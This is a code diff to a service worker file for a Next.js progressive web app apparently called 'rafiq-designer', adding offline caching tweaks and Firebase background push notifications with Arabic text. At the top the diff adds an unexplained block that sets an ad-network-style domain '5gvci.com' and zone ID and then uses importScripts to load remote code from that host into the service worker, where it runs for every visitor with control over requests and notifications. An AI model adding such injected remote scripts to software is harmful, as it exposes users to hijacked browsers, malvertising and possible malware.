@@ -1,14 +1,20 @@
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11367598
+};
+self.lary = "";
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw');
+
 const CACHE_NAME = 'rafiq-designer-v1';
 const OFFLINE_URL = '/offline.html';
 
 const ASSETS_TO_CACHE = [
   '/',
   '/manifest.json',
-  '/offline.html',
-  '/icons/icon-192x192.png',
-  '/icons/icon-512x512.png'
+  '/offline.html'
 ];
 
+// 1. Caching & Offline Capabilities
 self.addEventListener('install', (event) => {
   event.waitUntil(
     caches.open(CACHE_NAME).then((cache) => {
@@ -37,8 +43,6 @@ self.addEventListener('fetch', (event) => {
   const url = new URL(event.request.url);
 
   // Strictly Bypassing Service Worker for ALL Next.js internal and development requests
-  // This is critical to avoid "Failed to load chunk" errors where the SW might intercept
-  // but fail to fetch dynamic JS chunks during development or after a redeploy.
   if (
     url.pathname.includes('/_next/') || 
     url.pathname.includes('/__next/') ||
@@ -46,8 +50,6 @@ self.addEventListener('fetch', (event) => {
     event.request.headers.get('RSC') === '1' ||
     event.request.headers.get('x-nextjs-data')
   ) {
-    // By not calling event.respondWith, we tell the browser to fetch it normally 
-    // without any service worker intervention.
     return;
   }
 
@@ -60,14 +62,12 @@ self.addEventListener('fetch', (event) => {
       })
     );
   } else {
-    // For non-Next.js assets (images, fonts, etc.), use simple match or fetch
     event.respondWith(
       caches.match(event.request).then((cachedResponse) => {
         if (cachedResponse) {
           return cachedResponse;
         }
         return fetch(event.request).catch(() => {
-          // If offline and not in cache, just let it fail naturally
           return new Response('Offline', { status: 503, statusText: 'Service Unavailable' });
         });
       })
@@ -75,4 +75,38 @@ self.addEventListener('fetch', (event) => {
   }
 });
 
-// Broadcast online status if needed, but client handles window.online
+// 2. Firebase Cloud Messaging (FCM) Background Notification Support
+// Import Firebase Scripts (compat version is best suited for Service Worker context)
+importScripts('https://www.gstatic.com/firebasejs/11.9.1/firebase-app-compat.js');
+importScripts('https://www.gstatic.com/firebasejs/11.9.1/firebase-messaging-compat.js');
+
+// Config object template - replace with your Firebase project credentials
+const firebaseConfig = {
+  apiKey: "YOUR_API_KEY",
+  authDomain: "YOUR_AUTH_DOMAIN",
+  projectId: "YOUR_PROJECT_ID",
+  storageBucket: "YOUR_STORAGE_BUCKET",
+  messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+  appId: "YOUR_APP_ID"
+};
+
+// Initialize Firebase App
+firebase.initializeApp(firebaseConfig);
+
+// Retrieve Firebase Messaging
+const messaging = firebase.messaging();
+
+// Handle background messages
+messaging.onBackgroundMessage((payload) => {
+  console.log('[sw.js] Received background message ', payload);
+  
+  const notificationTitle = payload.notification?.title || 'رسالة جديدة من رفيق المصمم';
+  const notificationOptions = {
+    body: payload.notification?.body || 'لديك محتوى جديد بانتظارك!',
+    icon: payload.notification?.icon || 'https://picsum.photos/seed/rafiq-icon/192/192',
+    badge: 'https://picsum.photos/seed/rafiq-icon/192/192',
+    data: payload.data
+  };
+
+  self.registration.showNotification(notificationTitle, notificationOptions);
+});
